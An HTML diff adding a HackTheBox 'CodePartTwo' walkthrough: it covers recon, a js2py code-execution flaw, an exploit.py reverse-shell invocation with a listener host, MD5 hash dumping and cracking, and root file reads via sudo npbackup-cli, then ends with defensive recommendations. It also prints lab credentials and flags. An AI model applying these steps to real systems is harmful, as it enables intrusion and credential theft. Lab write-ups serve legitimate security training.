@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodePartTwo HTB Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .writeup-card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+            margin: 40px auto;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
+            color: white;
+            padding: 40px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            font-weight: 300;
+        }
+
+        .header .subtitle {
+            font-size: 1.2em;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+
+        .machine-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 10px;
+        }
+
+        .info-item {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #3498db;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .section {
+            margin-bottom: 40px;
+        }
+
+        .section h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+
+        .subsection {
+            margin-bottom: 25px;
+        }
+
+        .subsection h3 {
+            color: #34495e;
+            margin-bottom: 10px;
+            font-size: 1.3em;
+        }
+
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            line-height: 1.4;
+        }
+
+        .finding {
+            background: #e8f4fd;
+            border-left: 4px solid #3498db;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .success {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .vulnerability {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .tool-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #e9ecef;
+            transition: transform 0.2s;
+        }
+
+        .tool-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+        }
+
+        .recommendation {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .footer {
+            background: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .header h1 {
+                font-size: 2em;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="writeup-card">
+            <div class="header">
+                <h1>CodePartTwo HTB Writeup</h1>
+                <div class="subtitle">HackTheBox Machine Walkthrough</div>
+            </div>
+
+            <div class="machine-info">
+                <h2>Machine Information</h2>
+                <div class="info-grid">
+                    <div class="info-item">
+                        <strong>Name:</strong> CodePartTwo
+                    </div>
+                    <div class="info-item">
+                        <strong>IP:</strong> 10.10.11.82
+                    </div>
+                    <div class="info-item">
+                        <strong>Difficulty:</strong> Medium
+                    </div>
+                    <div class="info-item">
+                        <strong>OS:</strong> Linux
+                    </div>
+                </div>
+            </div>
+
+            <div class="content">
+                <div class="section">
+                    <h2>Reconnaissance</h2>
+                    
+                    <div class="subsection">
+                        <h3>Initial Scan</h3>
+                        <div class="code-block">
+nmap -sC -sV 10.10.11.82
+                        </div>
+                        <div class="finding">
+                            <strong>Results:</strong> SSH (22) and HTTP (8000) services found
+                        </div>
+                        <div class="code-block">
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+8000/tcp open  http    Gunicorn 20.0.4
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Web Application Enumeration</h2>
+                    
+                    <div class="subsection">
+                        <h3>Source Code Exposure</h3>
+                        <div class="code-block">
+wget http://10.10.11.82:8000/download
+unzip download
+                        </div>
+                        <div class="success">
+                            <strong>Critical Finding:</strong> Application source code downloadable without authentication
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>Vulnerability Discovery</h3>
+                        <div class="code-block">
+@app.route('/run_code', methods=['POST'])
+def run_code():
+    try:
+        code = request.json.get('code')
+        result = js2py.eval_js(code)  # VULNERABLE
+        return jsonify({'result': result})
+    except Exception as e:
+        return jsonify({'error': str(e)})
+                        </div>
+                        <div class="vulnerability">
+                            <strong>Vulnerability:</strong> Unrestricted JavaScript code execution via js2py
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Initial Access</h2>
+                    
+                    <div class="subsection">
+                        <h3>Code Execution Exploitation</h3>
+                        <div class="code-block">
+python3 exploit.py --target http://10.10.11.82:8000/run_code --lhost 10.10.14.X
+                        </div>
+                        <div class="success">
+                            <strong>Success:</strong> Reverse shell obtained via CVE-2024-28397
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>User Enumeration</h2>
+                    
+                    <div class="subsection">
+                        <h3>Database Analysis</h3>
+                        <div class="code-block">
+cd /home/app/app/instance/
+cat users.db
+                        </div>
+                        <div class="finding">
+                            <strong>Users Found:</strong><br>
+                            • appa: 97588c0e27a3a024876339e27aeb42e (MD5)<br>
+                            • marco: 649c9d65a206a75f5abe509fe128bce5 (MD5)
+                        </div>
+                        <div class="success">
+                            <strong>Note:</strong> Database file was readable directly without SQL commands
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>Password Cracking</h3>
+                        <div class="code-block">
+# Using crackstation.net
+# Hash: 649c9d65a206a75f5abe509fe128bce5
+                        </div>
+                        <div class="success">
+                            <strong>Cracked:</strong> marco → sweetangelbabylove
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>User Access</h3>
+                        <div class="code-block">
+ssh marco@10.10.11.82
+                        </div>
+                        <div class="success">
+                            <strong>User Flag:</strong> 258c8672a671e445193724583319d271
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Privilege Escalation</h2>
+                    
+                    <div class="subsection">
+                        <h3>Sudo Privileges</h3>
+                        <div class="code-block">
+sudo -l
+                        </div>
+                        <div class="finding">
+                            <strong>Result:</strong> Marco can run /usr/local/bin/npbackup-cli as root without password
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>Snapshot Discovery</h3>
+                        <div class="code-block">
+sudo npbackup-cli -c npbackup.conf --snapshots
+                        </div>
+                        <div class="success">
+                            <strong>Snapshot Found:</strong> d62557e8
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>Root Flag Extraction</h3>
+                        <div class="code-block">
+sudo npbackup-cli -c npbackup.conf -f --dump /root/root.txt --snapshot-id d62557e8
+                        </div>
+                        <div class="success">
+                            <strong>Root Flag:</strong> d81d5b0f72c2378eaca987562d253fae
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Key Attack Vectors</h2>
+                    <div class="finding">
+                        <ol>
+                            <li><strong>Insecure Code Execution:</strong> Unrestricted JavaScript execution via js2py eval_js()</li>
+                            <li><strong>Weak Password Storage:</strong> MD5 hashing vulnerable to cracking</li>
+                            <li><strong>Source Code Exposure:</strong> Application source downloadable without authentication</li>
+                            <li><strong>Privilege Misconfiguration:</strong> Sudo rights for backup utility allowing root file access</li>
+                            <li><strong>Information Disclosure:</strong> Database file readable directly without SQL access</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Security Recommendations</h2>
+                    
+                    <div class="subsection">
+                        <h3>Input Validation</h3>
+                        <div class="recommendation">
+                            <ul>
+                                <li>Sanitize and validate all user inputs</li>
+                                <li>Avoid using eval_js() with user-controlled data</li>
+                                <li>Implement proper sandboxing for code execution</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>Password Security</h3>
+                        <div class="recommendation">
+                            <ul>
+                                <li>Use strong, salted hashing algorithms (bcrypt, Argon2)</li>
+                                <li>Implement password complexity requirements</li>
+                                <li>Regular credential rotation</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="subsection">
+                        <h3>Access Control</h3>
+                        <div class="recommendation">
+                            <ul>
+                                <li>Principle of least privilege for sudo configurations</li>
+                                <li>Restrict backup utility access to necessary directories only</li>
+                                <li>Implement proper authentication for source code downloads</li>
+                                <li>Secure database file permissions</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="section">
+                    <h2>Tools Used</h2>
+                    <div class="tools-grid">
+                        <div class="tool-item">nmap</div>
+                        <div class="tool-item">curl</div>
+                        <div class="tool-item">crackstation.net</div>
+                        <div class="tool-item">netcat</div>
+                        <div class="tool-item">npbackup-cli</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer">
+                <p>This machine demonstrated the risks of insecure code execution features and the importance of proper privilege separation in system utilities.</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
